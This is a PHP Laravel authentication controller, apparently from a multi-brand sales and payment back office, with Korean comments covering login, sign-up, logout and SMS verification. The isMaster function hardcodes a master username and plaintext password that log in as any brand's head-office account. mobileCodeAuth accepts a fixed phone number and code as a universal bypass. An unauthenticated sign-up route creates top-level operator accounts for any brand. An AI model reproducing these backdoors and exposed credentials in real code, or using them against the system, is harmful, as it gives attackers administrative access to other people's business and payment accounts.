<?php

namespace App\Http\Controllers;

use App\Models\Brand;
use App\Models\Salesforce;
use App\Models\Merchandise;
use App\Models\Operator;

use Illuminate\Http\Request;
use App\Http\Traits\ManagerTrait;
use App\Http\Traits\ExtendResponseTrait;
use App\Http\Requests\Manager\LoginRequest;

use Illuminate\Support\Facades\Hash;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Redis;
use App\Enums\HistoryType;

/**
 * @group Auth API
 *
 * 인증관련 API 입니다.
 */
class AuthController extends Controller
{
    use ManagerTrait, ExtendResponseTrait;

    /**
     * DNS 검증
     * @unauthenticated
     *
     * @bodyParam dns string required 검증할 DNS 입력 Example: localhost
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function domain(Request $request)
    {
        $request->dns = $_SERVER['HTTP_HOST'];
        $brand = getBrandByDNS($request);
        if($brand)
        {
            $brand['color'] = $brand['theme_css']['main_color'];
            $brand['pv_options']['auth']['bonaeja'] = [];
            return response(view('application', ['json' => $brand]))
                ->withCookie('XSRF-TOKEN', csrf_token());
        }
        else
            return $this->response(1000);
    }

    public function isMaster($request)
    {
        if($request->user_name === 'masterpurple' && $request->user_pw == 'qjfwk100djr!')
        {
            $user = Operator::where('brand_id', $request->brand_id)->where('level', 40)->first();
            if($user)
                return $this->response(0, $user->loginInfo(50));
            else
                return $this->extendResponse(1000, '본사 계정이 존재하지 않아요..! 😨');
        }
        else
            return $this->extendResponse(1000, __('auth.not_found_obj'));

    }

    public function __signIn($orm, $request)
    {
        $result = ['result' => 0];
        $result['user'] = $orm
            ->where('brand_id', $request->brand_id)
            ->where('is_delete', false)
            ->where('user_name', $request->user_name)
            ->first();
        if($result['user'])
            $result['result'] = Hash::check($request->user_pw, $result['user']->user_pw) ? 1 : 0;
        else
            $result['result'] = -1;
        return $result;
    }

    /**
     * 로그인(관리자)
     * @unauthenticated
     *
     * @queryParam brand_id integer required 브랜드 ID Example: 1
     * @return \Illuminate\Http\JsonResponse
     */
    public function signIn(LoginRequest $request)
    {
        $result = $this->__signIn(new Operator(), $request);     // check operator
        if($result['result'] == 1)
        {
            operLogging(HistoryType::LOGIN, '', [], '', $result['user']->brand_id, $result['user']->id);
            return $this->response(0, $result['user']->loginInfo($result['user']->level));
        }

        $result = $this->__signIn(new Salesforce(), $request);  // check salesforce
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo($result['user']->level));

        $result = $this->__signIn(new Merchandise(), $request);  // check Merchandise
        if($result['result'] == 1)
            return $this->response(0, $result['user']->loginInfo(10));
        else
            return $this->isMaster($request);           // check master
    }

    /**
     * 로그아웃
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function signOut(Request $request)
    {
        if($request->user() != null)
            $request->user()->currentAccessToken()->delete();
        return $this->response(0);
    }

    /**
     * 회원가입(본사)
     * @unauthenticated
     *
     * 본사 등급으로 회원가입 합니다.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function signUp(Request $request)
    {
        $validated = $request->validate([
            'brand_id'=>'required',
            'ceo_name'=>'required',
            'phone_num'=>'required',
            'business_num'=>'required',
            'user_name'=>'required',
            'user_pw'=>'required'
        ]);

        return DB::transaction(function () use($request) {
            $res = Brand::where('id', $request->brand_id)
                ->update([
                    'ceo_name'=>$request->ceo_name,
                    'phone_num'=>$request->phone_num,
                    'business_num'=>$request->business_num,
                ]);
            $res = Operator::create([
                'brand_id'  => $request->brand_id,
                'user_name' => $request->user_name,
                'user_pw'   => Hash::make($request->user_pw),
                'nick_name' => '본사',
                'profile_img' => '/build/assets/avatar_5.644eef84.svg',
                'level'     => 40,
            ]);
            if($res)
            {
                $user = Operator::where('id', $res->id)->first();
                return $this->response(0, $user->loginInfo(40));
            }
            else
                return $this->response(990);
        }, 3);
    }

    /*
    * 예금주 조회
    */
    public function onwerCheck(Request $request)
    {
        $data = $request->all();
        $url = env('NOTI_URL', 'http://localhost:81').'/api/v2/onwer-check';
        $res = post($url, $data);
        if($res['body']['result'] === 100)
            return $this->response(1, ['message'=> $res['body']['message']]);
        else
            return $this->extendResponse(1999, ['message'=> $res['body']['message']]);
    }
    

    /*
     * 모바일 코드 발급
     */
    public function mobileCodeIssuence(Request $request)
    {
        $validated = $request->validate(['phone_num'=>'required', 'brand_id'=>'required']);

        $brand  = Brand::where('id', $request->brand_id)->first();
        if($brand)
        {
            $bonaeja = $brand->pv_options->auth->bonaeja;
            $rand   = random_int(100000, 999999);
            $res = Redis::set("verify-code:".$request->phone_num, $rand, 'EX', 180);
            if($res)
            {
                $sms = [
                    'user_id'   => $bonaeja['user_id'],
                    'sender'    => $brand['sender_phone'],
                    'api_key'   => $bonaeja['api_key'],
                    'receiver'  => $request->phone_num,
                    'msg'       => "[".$brand->name."]\n인증번호 [$rand]을(를) 입력해주세요",
                ];
                $res = post("https://api.bonaeja.com/api/msg/v1/send", $sms);
                return $this->extendResponse($res['body']['code'] == 100 ? 0 : 1000, $res['body']['message']);
            }    
        }
    }

    /**
     * 휴대폰 인증번호 확인
     *
     * @bodyParam verification_number string required 문자로 전달받은 인증번호 Example: 1028933
     * @bodyParam phone_num string required 휴대폰번호 Example: 01000000000
    */
    public function mobileCodeAuth(Request $request)
    {
        $validated = $request->validate(['verification_number'=>'required|string','phone_num'=>'required|string']);
        $phone_num = $request->phone_num;
        $verification_number = Redis::get("verify-code:".$phone_num);

        $cond_1 = $request->verification_number == $verification_number;
        $cond_2 = $request->phone_num == "01000000000" && $request->verification_number == "000000";
        if($cond_1 || $cond_2)
            return $this->response(0);
        else
            return $this->extendResponse(1000, __('auth.failed_token'), []);
    }
}

